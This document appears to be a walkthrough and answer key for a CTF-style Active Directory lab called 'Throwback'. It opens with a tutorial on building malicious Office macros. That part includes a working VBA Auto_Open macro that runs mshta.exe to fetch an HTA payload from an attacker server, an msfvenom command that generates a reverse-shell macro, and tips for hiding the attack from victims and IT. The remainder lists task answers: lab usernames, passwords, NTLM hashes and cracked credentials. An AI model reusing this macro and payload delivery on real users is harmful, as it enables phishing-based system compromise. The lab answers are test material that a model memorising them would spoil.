Now that you are more familiar with creating a Macro and utilizing the Auto\_Open feature within Office Products, we can dive into creating and generating malicious Macros.

First, we will start off by manually creating a macro. We will be re-using the code from the previous section as our base, and we will also be utilizing Metasploit’s HTA Server to gain a reverse shell.

To set up Metasploit’s HTA Server for payload delivery you will need to use the module exploit/windows/misc/hta\_server as seen in the screenshot below:


![](https://lh3.googleusercontent.com/ohs4o9V4K2gQHAt7fSPlaSRiCH9lxcrTE34Von3K8nPL_VeaIGiYKQRV9kqCQYMJJ3qD0rdY1dbv8vvXlH7NMyMPlrdavLit1t6fJPTDybFkG_ajcigNkqV7LzHuHudbZMNNa97f)  


### Starting Metasploit’s HTA Server for Remote Payload Delivery

  
The URL containing the “Local IP” (In this case: https://192.168.100.128:8080/c94O6fz.hta) is the server that will deliver the payload to the unsuspecting victim. At the moment, we only have a URL that will deliver a payload, so how does this get executed on the machine? 

Simply reaching out to the remote server won’t cause the payload to fire, because it’s not an executable (It’s a .hta). We can use mshta.exe (A built-in executable on Windows devices that’s used to aid in script execution with HTML applications) to execute the file on the remote server and return a shell. You can do this by calling mshta.exe followed by the URL of the Payload Delivery server, ex. https://192.168.100.128:8080/c94O6fz.hta, so the full command would look as follows.

`mshta.exe https://192.168.100.128:8080/c9406fx.hta`    

If we simply change our previous command in our “Hello World” Macro from Invoke-WebRequest to the command above (Remember, your IP address will be different), we will have a reverse shell returned.

  
![](https://lh6.googleusercontent.com/Ep8ec7o9eITsqOMuR04TiMKrSR1bcc5Pkxe6uueoeW38ZtRMs21fVj_RcH1LM4xgve45yxa4e8g1mEyzJ6toBWJb33Bi5Pikou9jdlMyjUQkqOkWKd9k3f5HB6nPv5PTtmOCN_sy)  

The Updated Hello World Macro with mshta.exe being executed

Code Below:

  
```
Sub HelloWorld()

    PID = Shell("mshta.exe https://192.168.100.128:8080/c9496fz.hta")

End Sub

  

Sub Auto\_Open()

    HelloWorld

End Sub
```
    

If we run the script Macro now, we should see mshta.exe reach out to our Payload server and successfully deliver the payload.

![](https://lh4.googleusercontent.com/eLueKr9RUDeUo-gBrAE9Wfoh_6YUId9T2MrCXBmVhg0pPdBhOmBDu0SYZqbXS3OJ1HkgCc_VlOSTU9LkXk7n3pgLQJ7mUc-viLG-sOMAZHk1JAcH-BXjmB1RFCGXqnDQYuuw05l9)  

  

The Microsoft HTA Server Successfully Delivered The Payload, Landing a Shell

### Generating Macros with msfvenom

Alternatively, you can use msfvenom to create Malicious Macros, the syntax is much simpler, all you need to do is the following:

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=53 -f vba -o macro.vba`    


The above command will generate a Visual Basic Macro that will execute a reverse shell, your output will look something like so and will go directly into your Macro.



![](https://lh4.googleusercontent.com/9HqBcdnBawKKSNq1n-9WYOnFA5uB6Y2WCEpNGqmtCtOfYPUUVXQbw5y8lOYsjxmJwZ-e2_VcpxYqEIe1liZjTyOA1Cm_vt9cM2wQtKSL7cpdvNeOIrpbeZiD6icjMbzBJ0MhbMxU)  
 
### Utilizing MSFVenom to Generate a Malicious Macro

  

You will need to take the given visual basic macro from MSFVenom and paste it into the excel macro editor.

  

![](https://lh3.googleusercontent.com/xCyRp4XYRRUowL5QyzAxFzPELqWv94yJacxBOcoGP5CXCbwrvS-lISNVFyjdTtTvjzLHQt1Xp1SrotJr9QssJkqmzt0YjMQYi8mTLze-OWp15ZZPqx5_wlJX_FYpuRyceXiICyR2)  


### The Macro Pasted into Microsoft’s Visual Basic Macro Editor.

  

Note: This is only an alternative to show theory behind malicious macros. There is Anti-Virus enabled on the box and we highly recommend that you take the HTA server route for creating a malicious macro.


### Sending off the Malicious Macro

 
After setting up exploit/multi/handler to catch the Reverse Shell, we are ready to have the end-user open the Document.


![](https://lh6.googleusercontent.com/jREClOHTT9HK4yAwGT5OK-jEwUnBE0vb3Mb9DfbUGnfNwxRBrCtkyjOrdP2ABoPnvhlJ-yQ_jL52qvYWpai7Tb6YhQ2iCWOiXqEUEqo0Mds-jVl9wAGU1MhXylCaLoXrz7MrhTO2)  

### Utilizing Metasploit’s exploit/multi/handler to catch a Reverse Shell  

![](https://lh6.googleusercontent.com/fjXs5dOjZwsgE_bHR17ltNRB8LZHGVPuWUsklGaj0hcIAhvbjRcIuM08fML0tJFptsQL3oVwqFxanohQFu0nzryzPP7k6U9v3xSizUm49rkBq_3BEFpO_zdOYk-MUnbQOah_BY-i)  

### Compromising the Target System with the use of Malicious Macros

Success, our payload successfully fired, the end-user has absolutely no knowledge that we have compromised their system. If you attempt to use this in the real world (with Authorization of course), it’s ideal that you populate the spreadsheet with actual data. Opening up a spreadsheet/document with absolutely no data is a quick way to raise some alarms.


### Finding an Attack Vector

Attempting to find an attack vector to successfully utilize Malicious Macros may be difficult at first, the trick is asking yourself “Is a human going to read this?”. If you answer “Yes”, it’s worth attempting this attack. You should be cautious when using this attack because you never know who’s inbox it might end up in. The last thing you want is IT aware of your presence on the network..


## Tasks

### Entering the Breach

What is the domain name?

`THROWBACK.local`

What is the HTTP title of the web server running on THROWBACK-PROD?

`Throwback Hacks`

How many ports are open on THROWBACK-MAIL?
`4`

What service is running on THROWBACK-FW01?

`pfsense`
What version of Apache is running on THROWBACK-MAIL?

`Apache/2.4.29`

###  Exploring the Caverns

Who is the CEO of Throwback Hacks? 

`Summers Winters`

Where is the company located?

`Great Britain`

What is the guest username on the mail server?

`tbhguest`

What is the guest password on the mail server?

`WelcomeTBH1!`

### Web Shells and You!

What username was used to access the configuration portal?

`admin`

What password was used to access the configuration portal?  

`pfsense`

What menu tab contains a command prompt tab in the PFSense Configuration panel?

`Diagnostics`

###  First Contact

What log file was found that is not a default log?

`login.log`

What user was found within the log?

`HumphreyW`

What is the hash of the user?
`1c13639dba96c7b53d26f7d00956a364`

### Wait, just you mean just one this time?

What is the username parameter in the POST request?  

`login_username`

What is the password parameter in the POST request?  

`secretkey`

What username found with hydra starts with an M?  

`MurphyF`

What is the password found with hydra?

`Summer2020`

### Gone Phishing

What User was compromised via Phishing?

`BlaireJ`

What Machine was compromised during Phishing?

`THROWBACK-WS01`


### Just a Drop Will Do

What User fell victim to LLMNR Poisoning?

`PetersJ`

What is the 4th octet of the IP Address the LLMNR request came from?  

`219`

What is the hostname of the device?

`THROWBACK-PROD`

### We Will, We Will, Rockyou


What is the cracked password from the pfSense hash?

`secuirtycenter`

What is the cracked password from LLMNR poisoning?

`Throwback317`

### Building Your Own Dark... er Deathstar

No answer needed only to setup starkiller and powershell-empire

### Deploy the Grunts!

We only want to make the listener and the stager with the proper IP , host and with `windows/launcher_bat`

###  Get-Help Invoke-WorldDomination

In this task we only needed to host that backdoor on our local machine , transfer it to the target machine and execute it there

###  SEATBELT CHECK!

What user was found from seatbelt?

`admin-petersj`

### Dump It Like It's Hot

Understanding `mimikatz` post-exploitation tool

### Not the soft and fluffy kind

What domain user was logged in?

`BlaireJ`

What is the user's hash?

`c374ecb7c2ccac1df3a82bce4f80bb5b`

What is the administrator's NTLM hash?

`a06e58d15a2585235d18598788b8147a`


### Yo Dawg, I heard you like proxies.

No answer needed just to get a meterpreter session run autoroute and socks4 proxy 

### Good Intentions, Courtesy of Microsoft

What two users could successfully pass the hash to THROWBACK-WS01? (In alphabetical order)

`HumphreyW`, `BlaireJ`

### Wallace and Gromit

What service account is kerberoastable?
`SQLSERVICE`

What domain does the trust connect to?  
`CORPERATE.LOCAl`

What normal user account is a domain admin?
`MERCERH`

### With three heads you'd think they'd at least agree once

What account was compromised by kerberoasting?

`SQLSERVICE`

What password was cracked from the retrieved ticket?

`mysql337570`

### You're Five Minutes Late...


What is the hostname of the device?  
`THROWBACK-TIME`

What is the title of the web page?  
`Throwback Hacks Timekeep`

What user was the password reset for?
`murphyf`

### Word to your Mother

What web server accepts XLSMs as a file upload?
`THROWBACK-TIME`

what page is the file upload in?  
`timesheet.php`

What is the name of the XLSMs that you can upload?
`Timesheet.xlsm`

### Meterpreter session 1 closed. Reason: World-Domination

Which user's hashes were we able to dump?
`Timekeeper`

What is the user's hash starting from the third colon?
`901682b1433fdf0b04ef42b13e343486`

What is the administrator's hash starting from the third colon?
`43d73c6a52e8626eabc5eb77148dca0b`

What is the user's cracked password?
`keeperoftime`

### We gotta drop the load!

What database are the timekeep login users located?  
`timekeepusers`

What database are the domain users located in?  
`domain_users`

What table was located in the domain users database?  
`users`

What is the first username in the table?
`ClemonsD`


###  So we're doing this again...

What user was successfully password sprayed?
`JeffersD`

What was the password for the user?

`Throwback2020`

 ### SYNCHRONIZE

What user has dcsync rights?
`backup`

What user can we dump credentials for and is an administrator?
`MercerH`

### This forest has trust issues

What domain has a trust relationship with THROWBACK.local?
`CORPORATE.LOCAL`

What is the hostname of the machine that has a forest trust with the domain controller?  
`CORP-DC01`

What is the Administrator account we can use to access the second forest?  
`MercerH`

What is the name of the file in the Administrator's Documents folder?
`server_update.txt`

### r/badcode would like a word

What User has a Github Account?
`Rikka Foxx`

What was the user found in github?  
`DaviesJ`

What password was found in github?  
`Management2018`

What machine can you access with the credentials?
`CORP-ADT01`

### Identity Theft is not a Joke Jim

What file is on the Administrator's Documents folder?  
`email_update.txt`

Who wrote the email?  
`Karen Dosier`

What is her official title in the company?
`Human Realtions Consulatant`

### Lost and Found


What is the Users email who has been affected by the Databreach?
`SEC-JStewart@TBHSecurity.com`

What was the Users password?  
`aqAwM53cW8AgRbfr`

What credentials could be found in the Email?

Format: User:Pass

`TBSEC_GUEST:WelcomeTBSEC1!`

